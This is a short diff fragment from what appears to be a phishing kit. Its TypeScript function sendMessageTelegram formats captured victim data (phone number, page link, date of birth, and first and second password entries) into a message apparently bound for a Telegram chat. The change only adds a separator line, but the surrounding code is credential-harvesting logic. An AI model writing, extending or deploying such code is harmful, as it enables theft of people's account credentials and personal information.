@@ -35,6 +35,7 @@ async function sendMessageTelegram(data: any): Promise<void> {
 <b>Phone Number:</b> <code>+${data.phone || ''}</code>
 <b>Link Page:</b> <code>${data.fanpage || ''}</code>
 <b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
+-----------------------------
 <b>Password First:</b> <code>${data.password || ''}</code>
 <b>Password Second:</b> <code>${data.passwordSecond || ''}</code>
 -----------------------------
